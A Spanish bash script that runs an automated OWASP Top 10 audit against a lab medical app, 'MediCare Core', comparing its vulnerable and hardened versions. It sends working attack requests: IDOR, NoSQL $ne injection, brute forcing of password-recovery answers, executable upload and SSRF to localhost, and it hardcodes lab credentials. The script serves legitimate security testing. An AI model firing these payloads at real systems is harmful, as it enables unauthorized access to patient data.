#!/bin/bash
# =============================================================================
# auditoria.sh - Auditoría automatizada MediCare Core (OWASP Top 10)
#
# Uso:    ./auditoria.sh <fase1|fase2> <IP_SERVIDOR> [PUERTO_HTTP] [PUERTO_HTTPS]
# Ej:     ./auditoria.sh fase1 3.15.20.10
#         ./auditoria.sh fase2 3.15.20.10 3000 3443
#
# Guarda una evidencia por riesgo en  auditoria/<fase>/evidencia_AXX.txt
# SOLO usar contra el laboratorio propio (datos ficticios).
# =============================================================================

usage() { echo "Uso: $0 <fase1|fase2> <IP_SERVIDOR> [PUERTO_HTTP] [PUERTO_HTTPS]"; exit 1; }

FASE=$1; IP=$2; HTTP_PORT=${3:-3000}; HTTPS_PORT=${4:-3443}
case "$FASE" in fase1|fase2) ;; *) usage ;; esac
[ -z "$IP" ] && usage

cd "$(dirname "$0")" || exit 1
OUT="$PWD/$FASE"
mkdir -p "$OUT"
rm -f "$OUT"/evidencia_A*.txt

HTTP_BASE="http://$IP:$HTTP_PORT"
HTTPS_BASE="https://$IP:$HTTPS_PORT"

# Fase 1: todo por HTTP. Fase 2: todo por HTTPS (certificado autofirmado => -k)
if [ "$FASE" = "fase1" ]; then
  API="$HTTP_BASE";  CK=();   APP_DIR="$PWD/../src/vulnerable"
else
  API="$HTTPS_BASE"; CK=(-k); APP_DIR="$PWD/../src/seguro"
fi

# E "texto fase1" "texto fase2"  -> elige el resultado esperado según la fase
E() { if [ "$FASE" = "fase1" ]; then echo "$1"; else echo "$2"; fi; }

# step ID "Título" "Esperado" <argumentos de curl...>
step() {
  local id=$1 titulo=$2 esperado=$3; shift 3
  local f="$OUT/evidencia_$id.txt"
  local cmd="curl -i -s" a
  for a in "$@"; do
    case "$a" in
      *[\ \{\}\"\$\[\]\&\;]*) cmd="$cmd '$a'" ;;
      *) cmd="$cmd $a" ;;
    esac
  done
  cmd=${cmd//$TOK_D/<TOKEN_DOCTOR>}
  cmd=${cmd//$TOK_P/<TOKEN_PACIENTE>}
  local resp rc code
  resp=$(curl -i -s -g --max-time 15 "$@" 2>&1); rc=$?
  {
    echo "# Evidencia $id - $titulo"
    echo "# Fecha: $(date '+%Y-%m-%d %H:%M:%S')   Fase: $FASE   Objetivo: $IP"
    echo "# Comando: $cmd"
    echo "# Esperado: $esperado"
    echo "# ----------------------------------------------------------"
    echo "$resp"
    echo
    echo "# [curl exit code: $rc (0 = OK, 7 = conexión rechazada, 35/60 = error TLS)]"
    echo
  } >> "$f"
  code=$(echo "$resp" | grep -m1 '^HTTP/' | awk '{print $2}')
  printf "[%s] %-34s -> HTTP %s\n" "$id" "$titulo" "${code:-sin respuesta (curl rc=$rc)}"
}

login() {
  curl -s -g --max-time 10 "${CK[@]}" -X POST "$API/api/login" \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"$1\",\"password\":\"$2\"}" \
    | grep -o '"token":"[^"]*"' | cut -d'"' -f4
}

echo "=== Auditoría MediCare Core | $FASE | $IP ==="
TOK_D=$(login doctor_martinez martinez123)
TOK_P=$(login paciente_garcia garcia456)
[ -z "$TOK_D" ] || [ -z "$TOK_P" ] && echo "AVISO: no se obtuvo token de login. Revisa IP/puerto o credenciales."

# ---------------------------------------------------------------- A01
step A01 "Control de acceso roto (IDOR)" \
  "$(E 'HTTP 200 con la ficha del paciente 1 (SSN incluido) usando el token de OTRO paciente' 'HTTP 403: el paciente solo puede ver su propia ficha')" \
  "${CK[@]}" "$API/api/record/1" -H "Authorization: $TOK_P"

# ---------------------------------------------------------------- A02
step A02 "Cifrado: receta por HTTP" \
  "$(E 'HTTP 200 por HTTP, firma digital en texto claro' 'HTTP 301/403: el HTTP plano ya no entrega la receta')" \
  "$HTTP_BASE/api/prescription/1" -H "Authorization: $TOK_D"
step A02 "Cifrado: receta por HTTPS" \
  "$(E 'Falla: el servidor no tiene TLS (exit code 7/35)' 'HTTP 200 sobre TLS, con cabecera Strict-Transport-Security')" \
  -k "$HTTPS_BASE/api/prescription/1" -H "Authorization: $TOK_D"

# ---------------------------------------------------------------- A03
step A03 "Inyección NoSQL (\$ne)" \
  "$(E 'HTTP 200 con TODOS los diagnósticos (count: 5)' 'HTTP 400: operadores $ no permitidos')" \
  "${CK[@]}" "$API/api/diagnosis/search?diagnosis[\$ne]=null" -H "Authorization: $TOK_D"

# ---------------------------------------------------------------- A04
step A04 "Datos de pacientes en carpeta pública" \
  "$(E 'HTTP 200: ficha de Juan Perez descargable sin login' 'HTTP 404/401: ya no es accesible públicamente')" \
  "${CK[@]}" "$API/patients/juan-perez.json"

# ---------------------------------------------------------------- A05
step A05 "Fuga de información (raíz /)" \
  "$(E 'HTTP 200 con SO, versión de Node, hostname; cabeceras de seguridad ausentes' 'Respuesta mínima, sin datos del servidor; cabeceras helmet presentes')" \
  "${CK[@]}" "$API/"
step A05 "Stack trace (JSON mal formado)" \
  "$(E 'HTTP 500 con stack trace y rutas internas' 'HTTP 400 con mensaje genérico, sin stack ni versiones')" \
  "${CK[@]}" -X POST "$API/api/login" -H 'Content-Type: application/json' -d '{"mal":'

# ---------------------------------------------------------------- A06
f="$OUT/evidencia_A06.txt"
{
  echo "# Evidencia A06 - Componentes vulnerables (npm audit)"
  echo "# Fecha: $(date '+%Y-%m-%d %H:%M:%S')   Fase: $FASE   Directorio: $APP_DIR"
  echo "# Comando: cd <app> && npm audit"
  echo "# Esperado: $(E 'Vulnerabilidades altas (cryptiles / boom / hoek)' 'found 0 vulnerabilities (paquete reemplazado)')"
  echo "# ----------------------------------------------------------"
  if [ -d "$APP_DIR" ] && command -v npm >/dev/null 2>&1; then
    (cd "$APP_DIR" && npm audit 2>&1)
  else
    echo "No se encontró $APP_DIR o npm. Ejecuta este paso en la máquina donde está clonado el repo."
  fi
} > "$f"
printf "[A06] %-34s -> %s\n" "Dependencias (npm audit)" "$(grep -v '^#' "$f" | grep -m1 -E 'vulnerabilit' || echo 'ver archivo')"

# ---------------------------------------------------------------- A07
f="$OUT/evidencia_A07.txt"
{
  echo "# Evidencia A07 - Recuperación de contraseña sin límite de intentos"
  echo "# Fecha: $(date '+%Y-%m-%d %H:%M:%S')   Fase: $FASE   Objetivo: $IP"
  echo "# Comando: curl -i -s -X POST $API/api/recover-password (5 intentos con lista de respuestas)"
  echo "# Esperado: $(E 'Todos los intentos se procesan; el 5º acierta y cambia la contraseña (fuerza bruta viable)' 'Bloqueo temporal HTTP 429 tras pocos intentos; nunca llega a acertar')"
  echo "# (newPassword = la misma contraseña original, para no alterar el laboratorio)"
  echo "# ----------------------------------------------------------"
} > "$f"
for resp in rex max toby luna firulais; do
  echo ">>> intento con respuesta '$resp'" >> "$f"
  curl -i -s -g --max-time 15 "${CK[@]}" -X POST "$API/api/recover-password" \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"doctor_lopez\",\"securityAnswer\":\"$resp\",\"newPassword\":\"lopez2024\"}" >> "$f" 2>&1
  echo >> "$f"; echo >> "$f"
done
printf "[A07] %-34s -> códigos: %s\n" "Fuerza bruta en recuperación" "$(grep '^HTTP/' "$f" | awk '{print $2}' | tr '\n' ' ')"

# ---------------------------------------------------------------- A08
TMPD=$(mktemp -d)
printf 'MZ-ejecutable-simulado' > "$TMPD/examen_malicioso.exe"
step A08 "Subida de archivo ejecutable" \
  "$(E 'HTTP 200: se acepta .exe y queda guardado' 'HTTP 400/415: tipo de archivo no permitido')" \
  "${CK[@]}" -X POST "$API/api/upload-exam" -H "Authorization: $TOK_D" -F "examFile=@$TMPD/examen_malicioso.exe"
step A08 "Descarga del archivo subido" \
  "$(E 'HTTP 200: el .exe es accesible desde la web' 'HTTP 404: el archivo nunca se guardó')" \
  "${CK[@]}" "$API/uploads/examen_malicioso.exe"
rm -rf "$TMPD"

# ---------------------------------------------------------------- A09
step A09 "Modificación de receta sin auditoría" \
  "$(E 'HTTP 200: receta modificada, sin registro de auditoría real' 'HTTP 200 y se genera una línea en logs/audit.log (usuario, IP, antes/después)')" \
  "${CK[@]}" -X PUT "$API/api/prescription/1" -H "Authorization: $TOK_D" -H 'Content-Type: application/json' \
  -d '{"dosage":"DOSIS-MODIFICADA-PARA-AUDITORIA"}'
[ "$FASE" = "fase2" ] && echo "     (A09 fase2) Copia también la línea nueva de logs/audit.log desde el servidor a $FASE/evidencia_A09_log.txt"

# ---------------------------------------------------------------- A10
step A10 "SSRF: el servidor consulta una URL interna" \
  "$(E 'HTTP 200: el servidor devuelve su propio endpoint interno (127.0.0.1)' 'HTTP 400/403: destino no permitido por lista blanca')" \
  "${CK[@]}" "$API/api/fetch-external-record?url=http://127.0.0.1:$HTTP_PORT/" -H "Authorization: $TOK_D"

echo "=== Listo. Evidencias en: $OUT ==="
